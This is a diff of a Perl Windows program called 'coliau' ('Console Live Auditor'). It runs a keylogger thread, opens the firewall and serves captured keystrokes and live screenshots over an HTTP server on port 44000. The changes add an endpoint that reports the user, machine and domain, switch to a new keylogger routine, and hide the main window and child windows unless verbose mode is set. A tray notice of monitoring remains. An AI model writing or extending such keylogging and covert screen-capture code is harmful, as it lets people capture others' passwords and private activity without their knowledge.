@@ -11,6 +11,7 @@
 
 package coliau;
 
+require v5.12;
 use common::sense;
 
 use IO::Select;
@@ -23,6 +24,7 @@ use Win32::API;
 use Win32::GUI();
 use Win32::GUI  qw (WM_QUERYENDSESSION WM_ENDSESSION WM_CLOSE);
 use Win32::GUI::DIBitmap;
+#use Win32::GUI::Timer;
 use Win32::GuiTest qw|FindWindowLike IsWindowVisible GetWindowText WMGetText IsKeyPressed GetAsyncKeyState|;
 use Getopt::Long;
 use threads;
@@ -30,24 +32,24 @@ use threads::shared;
 use IO::Socket::INET;
 use Win32::Process;
 use Sys::Hostname;
+use Win32::TieRegistry ( Delimiter=>'/');
 
 my $PORT=44000;
-my $VERBOSE=1;
-my $KEYLOG:shared="";
-my $TIP="Console Live Auditor\nhttp://www.unix.gr";
+my $VERBOSE=0;
+our $KEYLOG:shared="";
 my $SLIDESBITS=32;
 our %keymap;
-my  $domain=Win32::DomainName();
-
+our $camera_icon;
 push @INC, "." ;
 require "Keymap.pl";
 require "rau_html.pl";
 require "firewallopen.pl";
 require "dot_ico.pl";
-require "bull_lined.pl";
+require "camera_ico.pl";
+require "newkeylogger.pl";
 
 my $SLEEP=10;
-GetOptions (        'verbose'  		=> \$VERBOSE,);
+GetOptions ( 'verbose' => \$VERBOSE,);
 firewallOpen();
 
 #primary
@@ -63,7 +65,7 @@ my $imgFname="screen.png";
 my $NumScreens=CountMonitors();
 # used in the commercial software
 our $user=Win32::LoginName();
-our $Node=Win32::NodeName();
+our $node=Win32::NodeName();
 our $domain=Win32::DomainName();
 our $dot_icon;
 our $bull_lined_icon;
@@ -71,30 +73,37 @@ our $bc_icon;
 our $QUANTUM=105; # msecs
 my $RepeatHeader=initRepeatHeader();
 my $SESSION=~ "I am not a random session ID. The commercial version does that !";
-my $RESIZE=1;
+my $RESIZE=0;
 
 
-my $redIcon   	= makeIcon('red_dot.ico',$dot_icon);
-my $bullIcon  	= makeIcon('bull_lined.ico',$bull_lined_icon);
-#my $BCIcon  	= makeIcon('black_cursor.ico', $bc_icon);
+my $redIcon    	= makeIcon('red_dot.ico',$dot_icon);
+#my $bullIcon  	= makeIcon('bull_lined.ico',$bull_lined_icon);
+#my $bcIcon  	= makeIcon('bc.ico',$bc_icon);
+my $cameraIcon  = makeIcon('camera.ico',$camera_icon);
+
+
+my $host=hostname;
+my ($ip)=inet_ntoa((gethostbyname($host))[4]);
+my $TIP="  You can monitor me at\nhttp://$ip:$PORT";
 
 # Key logger thread
-my $keytid=threads->create('KeyLogger',$QUANTUM)->detach();
+#my $keytid=threads->create('KeyLogger',$QUANTUM)->detach();
+my $keytid=threads->create('KeyLogger_new')->detach();
 
 # GUI STUFF
 our $main = Win32::GUI::Window->new(
 	-name   => 'Main',
 	-width  => 300,
-	-height => 400,
-	-minsize => [300, 400],
-	-maxsize => [300, 400],
+	-height => 200,
+	-minsize => [300, 200],
+	-maxsize => [300, 200],
 	-text    => "Console Live Auditor Log",
-  	-visible => 1, 
+  	-visible => $VERBOSE, 
 	-resizable => 0,
-	-icon	=> $bullIcon,
+	-icon	=> $cameraIcon,
 );
 
-$main->ChangeSmallIcon($bullIcon);
+$main->ChangeSmallIcon($cameraIcon);
 
 $main->AddTextfield(
 		-text    => "",
@@ -102,7 +111,7 @@ $main->AddTextfield(
 		-left    => 0,
 		-top     => 0,
 		-width   => 295,
-		-height  => 370,
+		-height  => 170,
 		-multiline => 1,
 		-readonly => 1,
 		-autohscroll =>1,
@@ -111,53 +120,67 @@ $main->AddTextfield(
 
 our $trayIcon = $main->AddNotifyIcon(
 	-name	=> 'NI',
-	-icon	=> $bullIcon,
+	-icon	=> $cameraIcon,
 	-tip	=> $TIP ,
 );
 
 # if this thread is created elsewhere, perl croaks on exit !
-my $webtid=threads->create('web',$SESSION,$trayIcon,$bullIcon,$redIcon)->detach();
+my $webtid=threads->create('web',$SESSION,$trayIcon,$cameraIcon,$redIcon)->detach();
 
 colLog("Close this window for Coliau to terminate\r\n") if ( $VERBOSE);
 colLog("I found $NumScreens Screens") if ( $VERBOSE);
-colLog("Listening on port $PORT") if ( $VERBOSE);
+colLog($TIP) if ( $VERBOSE);
+
+my $t1 = $main->AddTimer('T1', 1000);
+
+    
 Win32::GUI::Dialog(); # pass control over
+
 $main->NI->Remove() ;
 1;
 
 ################################################################################################
 ################################################################################################
 ################################################################################################
-
+sub T1_Timer {
+        colLog ("Timer went off!\n");
+   }
+	
 sub Main_Terminate {
 		$main->NI->Remove() ;
-		-1;
+		return -1;
 }
 sub main_Terminate {
 		$main->NI->Remove() ;
-		-1;
+		return -1;
 }
 sub Shutdown{
-	print STDERR "Shutdown Called" if ( $VERBOSE);
+	colLog("Shutdown Called") if ( $VERBOSE);
 	$main->NI->Remove();
-	exit;
 }
 
 sub Main_Minimize {	
     $main->Disable();
     $main->Hide();
-    1;
+    return 1;
 }
 
  sub NI_Click { # don't work with other threads ! Systray does that nicely    
-	print "click";
-    1;
+	colLog("click") if ( $VERBOSE);
+    return 1;
 }
+
+
+END {	#overkill ^2
+	Shutdown();
+}
+
+
 
 
 ########################################################################################
 sub web{
-my ($SESSION,$trayicon,$bullIcon,$redIcon)=@_;
+my ($SESSION,$trayicon,$cameraIcon,$redIcon)=@_;
 
 $HTTP::Daemon::PROTO = "HTTP/1.0";  # sorry guys single threaded , must avoid blocking
 
@@ -173,19 +196,20 @@ colLog("Web Server On\r\n\r\n") if ( $VERBOSE);
 
 my $numrequests=0;
 	while ( 1 ) {
+	if ( $Registry->{"LMachine/SOFTWARE/KIDNS/STATUS"} ne "ALIVE") {
+		Shutdown();
+		exit();
+	} 
 	my 	$c = $daemon->accept;
 	next if ( ! $c ); # timed out
 	
 	# Verify the caller	( commercial only )
 	my @ip = unpack("C4",$c->peeraddr);	  
 	my $ip=join(".",@ip);
-#	my $peername = gethostbyaddr($c->peeraddr,AF_INET);
-#	colLog( $peername . ' = ' )if  ( ( $peername) && ( $VERBOSE) );
 		
 	set_icon($trayIcon,$redIcon,"Your Session is being monitored") if ( $trayicon);
-		# go for it			
 	process_one_req($c,$SESSION,$ip);
-	set_icon($trayIcon,$bullIcon,$TIP) if ( $trayicon);	
+	set_icon($trayIcon,$cameraIcon,$TIP) if ( $trayicon);	
 	$c->close;		
 	threads->yield();
 	$numrequests++;		
@@ -235,6 +259,15 @@ my $IP=shift;
 			$connection->send_response($response);	
 			return;
 	}
+
+	if  ($path eq "id" ) {	
+       		my $response = HTTP::Response->new(200);
+			my $Text="user:$user\r\nnode:$node\r\ndomain:$domain\r\n";
+			my $Text="$domain\\\\$node\\$user\r\n";
+       		$response->content($Text);
+			$connection->send_response($response);	
+			return;
+	}
 	
 	
 	# URL is /monitor or null
@@ -250,12 +283,10 @@ my $IP=shift;
 	}
 	if ( $path =~ /^monitor/ ) {
 		redirToURL($connection,"/monitor");
-		#domonitor($connection,$RepeatHTML,$SESSIONID,$IP);
 		return;
 	}
 	
-	
-	# throw the screen at em
+		# throw the screen at em
     if  ($path =~ /^screen([1-4]*)\.png$/ )  {		
 		my $scrnum=1;
 		if ( $1 ) {
@@ -277,20 +308,17 @@ my $IP=shift;
 	if ( $path eq "scale" ){
 		$RESIZE=1;
 		redirToURL($connection,"/monitor");		
-		#domonitor($connection,$RepeatHTML,$SESSIONID,$IP);
 		return;
 	}
 	if ( $path eq "mobile" ){
 		$RESIZE=2;
 		redirToURL($connection,"/monitor");		
-		#domonitor($connection,$RepeatHTML,$SESSIONID,$IP);
 		return;
 	}
 	
 	if ( $path eq "noscale" ){
 		$RESIZE=0;
 		redirToURL($connection,"/monitor");		
-		#domonitor($connection,$RepeatHTML,$SESSIONID,$IP);
 		return
 	}
 	
@@ -305,6 +333,7 @@ my $IP=shift;
 	
 	if  ($path eq "keylog" ) {
 		my $Text=$KEYLOG;
+		colLOG($Text) if $VERBOSE;
 		$KEYLOG="";
 		my $response = HTTP::Response->new(200);
 		$response->content($Text);
@@ -356,7 +385,7 @@ my $IP=shift;
             $res=$connection->syswrite($resImage,$imgSize);            
             return if ( ( ! $res) || ( $res != $imgSize ) ); # break out
             print $connection  $boundary;            
-            Win32::Sleep(50); # 50 millisecs
+#            Win32::Sleep(50); # 50 millisecs
             threads->yield();
         } while (($res ) && ( $res==$imgSize));
     }
@@ -374,11 +403,11 @@ sub domonitor{
 	for (my $i=1;$i<=$NumScreens;$i++){		
 		my $fname="screen".$i.".png";
 		my $screen="screen".$i;
-		
+		my $href="<a href=\"/monitor\">";
 		if ( $RESIZE==0 ) {
-			$RepeatHTML .= 	"<img src=\"/$fname\"  width=\"100%\" name=\"$screen\" align=left>\r\n";
+			$RepeatHTML .= 	"<img src=\"/$fname\"  width=\"100%\" name=\"$screen\" align=left border=0>\r\n";
 		} else {
-		$RepeatHTML .= 	"<img src=\"/$fname\"  name=\"$screen\" align=left>\r\n";		
+			$RepeatHTML .= 	"<img src=\"/$fname\"  name=\"$screen\" align=left border=0>\r\n";		
 		}
 	}
 	$RepeatHTML .= "</html></body>";	
@@ -390,36 +419,13 @@ sub domonitor{
 
 
 
-######################################################################
-sub locatefile {
-	my $filename=shift;
-	      #snippet shamelessly stolen from splashscreen.pm
-      my @dirs;
-      # directory of perl script
-      my $tmp = $0; $tmp =~ s/[^\/\\]*$//;
-      push @dirs, $tmp;
-      # cwd
-      push @dirs, ".";
-      push @dirs, $ENV{PAR_TEMP} if exists $ENV{PAR_TEMP};
-      push @dirs, $ENV{PAR_TEMP}."/inc" if exists $ENV{PAR_TEMP};
-
-      for my $dir (@dirs) {
-              next unless -d $dir;
-              colLog( "Attempting to locate \"$filename\" in $dir") if ($VERBOSE);
-              if ( -f "$dir\\$filename" ) {
-                      return $dir;
-              }
-      }
-	  return undef;
-}
-
 
 
 ######################################################################
 # now catch the keyboard , while sleeping in fits and starts
 #
 # keylogger sleeps $QUANTUM miliseconds so use it to delay
-#
+# this was OK , but I got some new stuff to play with
 ######################################################################
 sub KeyLogger{
   my  ($QUANTUM)=@_;  
@@ -495,7 +501,7 @@ sub screendumper{
 		$result=$ditherd->SaveToData(Win32::GUI::DIBitmap::GetFIFFromFormat('PNG')) if ( $ditherd );
 	}
 	if ( $type eq 'GIF' ) {
-	print Win32::GUI::DIBitmap::GetFIFFromFormat('GIF');
+	print Win32::GUI::DIBitmap::GetFIFFromFormat('GIF') if ( $VERBOSE ) ;
 		$result=$ditherd->SaveToData(Win32::GUI::DIBitmap::GetFIFFromFormat('GIF') )  if ( $ditherd );	
 	}
 	
@@ -640,7 +646,7 @@ sub colLog {
 BEGIN {
 	# hide child windows like netstat :-)
  	if ( defined &Win32::SetChildShowWindow ){
-		Win32::SetChildShowWindow(0) ;
+		Win32::SetChildShowWindow(0) unless ($VERBOSE);
  	}
  }
 
